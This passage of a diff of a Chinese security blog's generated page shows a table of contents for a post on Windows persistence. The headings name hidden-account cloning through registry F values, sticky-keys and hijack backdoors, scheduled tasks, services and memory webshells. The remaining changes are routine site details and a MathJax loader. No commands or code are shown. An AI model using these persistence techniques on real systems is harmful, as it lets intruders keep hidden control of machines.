+F值替换为administrator 对应00000XXX.reg的F值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4test%E7%94%A8%E6%88%B7"><span class="nav-number">1.3.5.</span> <span class="nav-text">5.删除test$用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8cmd%E5%AF%BC%E5%85%A5test%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">1.3.6.</span> <span class="nav-text">6.在cmd导入test$的两个注册表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A83389%E7%99%BB%E5%BD%95-%E4%BC%9A-%E7%99%BB%E9%99%86%E5%88%B0administrator-%E7%9A%84%E5%BD%93%E5%89%8D%E7%8A%B6%E6%80%81%E4%B8%8B-%E5%AE%9E%E7%8E%B0adminstrator%E8%B4%A6%E6%88%B7%E7%9A%84%E5%85%8B%E9%9A%86"><span class="nav-number">1.3.7.</span> <span class="nav-text">7.使用3389登录
+会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="nav-number">1.4.</span> <span class="nav-text">组策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="nav-number">1.5.</span> <span class="nav-text">粘滞键后门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#shiftkey"><span class="nav-number">1.5.1.</span> <span class="nav-text">Shiftkey</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8"><span class="nav-number">1.6.</span> <span class="nav-text">劫持后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">1.7.</span> <span class="nav-text">注册表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.8.</span> <span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B0%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.9.</span> <span class="nav-text">新服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.10.</span> <span class="nav-text">内存马</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -501,7 +522,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -549,7 +570,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -563,7 +584,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -574,7 +595,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -714,6 +735,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
